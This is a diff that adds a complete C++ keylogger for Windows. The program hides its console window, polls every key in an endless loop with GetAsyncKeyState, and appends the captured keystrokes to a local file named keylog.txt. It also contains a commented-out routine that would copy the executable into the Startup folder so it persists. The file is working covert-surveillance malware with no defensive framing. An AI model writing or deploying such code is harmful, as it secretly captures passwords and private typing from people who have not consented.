@@ -1,0 +1,75 @@
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+#include <winuser.h>
+#include <shlobj.h>
+#include <filesystem>
+
+using namespace std;
+
+void hideConsole() {
+    HWND hwnd = GetConsoleWindow();
+    ShowWindow(hwnd, SW_HIDE);
+}
+
+//void copyToStartup() {
+//    char exePath[MAX_PATH];
+//    GetModuleFileNameA(NULL, exePath, MAX_PATH);
+//
+//    char startupPath[MAX_PATH];
+//    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startupPath))) {
+//        std::filesystem::path dest = std::string(startupPath) + "\\" + std::filesystem::path(exePath).filename().string();
+//
+//        if (!std::filesystem::exists(dest)) {
+//            CopyFileA(exePath, dest.string().c_str(), FALSE);
+//        }
+//    }
+//}
+
+void logKey(int key, ofstream& logFile) {
+    switch (key) {
+    case VK_RETURN: logFile << "[Enter]"; break;
+    case VK_TAB: logFile << "[Tab]"; break;
+    case VK_BACK: logFile << "[Backspace]"; break;
+    case VK_SPACE: logFile << ' '; break;
+    case VK_SHIFT: logFile << "[Shift]"; break;
+    case VK_CONTROL: logFile << "[Ctrl]"; break;
+    case VK_MENU: logFile << "[Alt]"; break;
+    case VK_ESCAPE: logFile << "[Esc]"; break;
+    case VK_LEFT: logFile << "[Left]"; break;
+    case VK_RIGHT: logFile << "[Right]"; break;
+    case VK_UP: logFile << "[Up]"; break;
+    case VK_DOWN: logFile << "[Down]"; break;
+    case VK_DELETE: logFile << "[Delete]"; break;
+    case VK_HOME: logFile << "[Home]"; break;
+    case VK_END: logFile << "[End]"; break;
+    case VK_PRIOR: logFile << "[PageUp]"; break;
+    case VK_NEXT: logFile << "[PageDown]"; break;
+    case VK_INSERT: logFile << "[Insert]"; break;
+    default:
+        if (key >= 32 && key <= 126)
+            logFile << static_cast<char>(key);
+        break;
+    }
+    logFile.flush();  // Ensure it writes immediately
+}
+
+int main() {
+    hideConsole();       // Hide the console
+    //copyToStartup();     // Copy itself to startup folder
+
+    ofstream logFile("keylog.txt", ios::app);  // Open log file in append mode
+    if (!logFile.is_open()) return 1;
+
+    // Keylogger loop
+    while (true) {
+        for (int key = 0; key < 256; key++) {
+            if (GetAsyncKeyState(key) & 1) {
+                logKey(key, logFile);
+            }
+        }
+        Sleep(10);  // Slight delay to reduce CPU usage
+    }
+
+    return 0;
+}
